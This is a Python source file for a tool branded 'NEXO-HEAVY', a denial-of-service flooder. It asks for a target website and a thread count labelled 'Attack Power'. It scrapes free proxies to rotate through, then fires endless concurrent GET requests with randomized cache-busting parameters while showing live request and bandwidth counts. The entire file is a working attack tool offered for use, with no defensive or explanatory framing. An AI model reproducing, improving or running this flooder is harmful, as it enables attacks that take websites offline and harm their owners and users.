import asyncio
import aiohttp
import random
import time
import sys
import os

# --- Color Definitions ---
G, Y, C, R, W, B = '\033[92m', '\033[93m', '\033[96m', '\033[91m', '\033[0m', '\033[1m'

def show_banner():
    os.system('clear')
    print(f"{R}{B}")
    # Adding 'r' before the string makes it a "Raw String" to ignore backslashes
    print(r"  _   _  _______   _____    _    _ ______  _______      ____     __")
    print(r" | \ | | | ____\ \ / / _ \  | |  | |  ____|/ ____\ \    / /\ \   / /")
    print(r" |  \| | | |__   \ V / | | | | |__| | |__  | (___  \ \  / /  \ \_/ / ")
    print(r" | . ` | |  __|   > <| | | | |  __  |  __|  \___ \  \ \/ /    \   /  ")
    print(r" | |\  | | |____ / . \ |_| | | |  | | |____ ____) |  \  /      | |   ")
    print(r" |_| \_| |______/_/ \_\___/  |_|  |_|______|_____/    \/       |_|   ")
    print(f"{G}======================================================={W}")
    print(f"{Y}  PROJECT:     {W}NEXO-HEAVY (V3.2)")
    print(f"{Y}  UPGRADE:     {W}AUTO PROXY SCRAPER & ROTATOR")
    print(f"{G}======================================================={W}\n")

async def scrape_proxies():
    print(f"{C}[*] Scraping fresh proxies...{W}")
    # Free Proxy API
    url = "https://api.proxyscrape.com"
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url) as resp:
                data = await resp.text()
                proxies = data.strip().split('\r\n')
                print(f"{G}[+] Successfully scraped {len(proxies)} proxies.{W}")
                return [f"http://{p}" for p in proxies if p]
    except Exception as e:
        print(f"{R}[!] Scrape Failed: {e}{W}")
        return []

async def heavy_request(session, url, proxies, stats):
    while True:
        proxy = random.choice(proxies) if proxies else None
        try:
            target = f"{url}?ref={random.randint(1, 999999)}"
            headers = {'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Safari/537.36"}
            
            async with session.get(target, headers=headers, proxy=proxy, timeout=5) as response:
                stats['total'] += 1
                stats['bytes_sent'] += 500
                if response.status == 200:
                    stats['success'] += 1
                else:
                    stats['failed'] += 1
        except:
            stats['errors'] += 1
            await asyncio.sleep(0.01)

async def monitor(stats, start_time):
    while True:
        elapsed = time.time() - start_time
        if elapsed > 0:
            total_mb = stats['bytes_sent'] / (1024 * 1024)
            mbps = total_mb / elapsed
            sys.stdout.write(f"\r{C}Reqs: {stats['total']} | {G}Success: {stats['success']} | {Y}Data: {total_mb:.2f} MB | {B}Speed: {mbps:.2f} MB/s{W}")
            sys.stdout.flush()
        await asyncio.sleep(0.2)

async def main():
    show_banner()
    target_url = input(f"{Y}Target Website: {W}").strip()
    if not target_url.startswith("http"):
        print(f"{R}[!] Error: Add http:// or https://{W}")
        return

    try:
        power = int(input(f"{Y}Attack Power (Threads): {W}"))
    except:
        return
    
    proxy_list = await scrape_proxies()
    
    stats = {'total': 0, 'success': 0, 'failed': 0, 'errors': 0, 'bytes_sent': 0}
    start_time = time.time()
    
    connector = aiohttp.TCPConnector(limit=None)
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [asyncio.create_task(monitor(stats, start_time))]
        for _ in range(power):
            tasks.append(asyncio.create_task(heavy_request(session, target_url, proxy_list, stats)))
        await asyncio.gather(*tasks)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{R}[!] Attack Terminated by NEXO TECH.{W}")

